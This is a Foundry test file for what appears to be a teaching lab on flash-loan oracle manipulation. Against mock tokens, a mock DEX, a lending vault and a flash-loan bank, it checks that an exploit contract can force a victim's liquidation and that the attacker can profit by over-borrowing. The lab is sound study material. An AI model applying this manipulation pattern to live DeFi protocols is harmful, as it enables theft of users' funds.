// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../../src/Flash-Loan-Oracle-Manipulation/MockERC20.sol";
import {PymDEX} from "../../src/Flash-Loan-Oracle-Manipulation/PymDEX.sol";
import {StarkVault} from "../../src/Flash-Loan-Oracle-Manipulation/StarkVault.sol";
import {AntManExploit} from "../../src/Flash-Loan-Oracle-Manipulation/AntManExploit.sol";
import {QuantumRealmBank} from "../../src/Flash-Loan-Oracle-Manipulation/QuantumRealmBank.sol";

contract PymFlashLoan is Test {
    MockERC20 tokenA;
    MockERC20 tokenB;
    PymDEX pym;
    StarkVault vault;
    AntManExploit exploit;
    QuantumRealmBank qrbA;

    address wasp = makeAddr("Wasp");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        // Deploy tokens
        tokenA = new MockERC20("TokenA", "A");
        tokenB = new MockERC20("TokenB", "B");

        // Deploy DEX
        pym = new PymDEX(address(tokenA), address(tokenB), 1_000_000 ether, 1_000_000 ether);
        tokenA.mint(address(pym), 1_000_000 ether);
        tokenB.mint(address(pym), 1_000_000 ether);

        // Deploy Vault
        vault = new StarkVault(address(tokenA), address(tokenB), address(pym));
        tokenB.mint(address(vault), 100_000 ether);

        // Deploy flash loan bank for TokenA
        qrbA = new QuantumRealmBank(address(tokenA));
        tokenA.mint(address(qrbA), 1_000_000 ether);

        // Setup victim
        tokenA.mint(wasp, 10_000 ether);
        vm.startPrank(wasp);
        tokenA.approve(address(vault), 10_000 ether);
        vault.depositCollateral(10_000 ether);
        vault.borrow(5_000 ether); // initial debt
        vm.stopPrank();

        // Deploy exploit contract
        exploit = new AntManExploit(address(pym), address(vault), address(tokenA), address(tokenB), payable(attacker));
    }

    // Scenario A: Liquidation succeeds
    function testScenarioA_LiquidationSuccess() public {
        bytes memory data = abi.encodeWithSelector(AntManExploit.execute.selector, 500_000 ether, wasp, 0);
        vm.prank(attacker);
        qrbA.flashLoan(500_000 ether, address(exploit), data);

        // Wasp collateral should be seized
        assertEq(vault.collateralBalance(wasp), 0);
    }

    // Scenario A: Over-borrow fails due to AMM slippage
    function testScenarioA_OverBorrowFails() public {
        bytes memory data = abi.encodeWithSelector(AntManExploit.execute.selector, 500_000 ether, wasp, 1);
        vm.expectRevert("loan not repaid");
        vm.prank(attacker);
        qrbA.flashLoan(500_000 ether, address(exploit), data);
    }

    // Scenario B: Over-borrow succeeds using TokenB flash loan
    function testScenarioB_OverBorrowSucceeds() public {
        // Deploy flash loan bank for TokenB
        QuantumRealmBank qrbB = new QuantumRealmBank(address(tokenB));
        tokenB.mint(address(qrbB), 1_000_000 ether);

        // Mint enough TokenB to the Vault to allow over-borrow
        tokenB.mint(address(vault), 1_000_000 ether);

        // Give exploit contract extra TokenA to repay swap-back
        tokenA.mint(address(exploit), 500_000 ether);

        bytes memory data = abi.encodeWithSelector(AntManExploit.execute.selector, 500_000 ether, wasp, 2);

        vm.prank(attacker);
        qrbB.flashLoan(500_000 ether, address(exploit), data);

        // Attacker should have profit in TokenB
        assertGt(tokenB.balanceOf(attacker), 0);
        console.log("Attacker TokenB profit:", tokenB.balanceOf(attacker));
    }
}
